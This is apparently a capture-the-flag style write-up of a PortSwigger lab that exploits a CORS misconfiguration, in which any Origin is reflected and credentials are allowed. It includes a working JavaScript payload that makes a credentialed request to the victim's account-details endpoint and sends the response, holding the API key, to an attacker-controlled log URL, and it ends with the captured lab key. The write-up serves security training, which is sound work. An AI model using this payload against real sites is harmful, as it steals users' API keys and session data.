![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/5aea67dd-52db-4579-bb8a-3f4a4bd8c746)

### Solution

first we login using the given credentials

Once logged in , we can see that there is an email update functionality & the API key of wiener

In the HTTP history tab, we can see that the GET request to /accountDetails contains the ACAC=true header in its response.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/a4b1326c-fac7-493e-bae7-0a63b09eaa98)

This meaans that if we can able to exploit CORS here then we can able to get the session cookie, API key etc of the user.

Exploiting CORS misconfiguration -

If we try to provide Origin: vulnerable.com , we can see that there is Access-Control-Allow-Origin: malicious.com & Access-Control-Allow-Credentials: true in the response.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/a7276cae-9747-4f4a-93c6-4efdc2cc441a)

This means the server takes the Origin provided in the request and sends it back in the response with the header Access-Control-Allow-Origin: <origin.com>.

Go to exploit server and paste the following code.

```js
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a01008d04b304068119168900c1005c.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='/log?key='+this.responseText;
};
</script>
```

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/7946d86f-f470-4cc9-8334-f7718894d735)

access log

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/881171b5-beec-4e74-a498-9e5d6e0c1049)

api key `Rv1tdW9QEjYmqxnjpGiogRNSp4yEatuy`

go and submit solution to solve the lab.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/08d3a649-8382-443b-945d-e60706eccbbd)

lab solved succesfully.
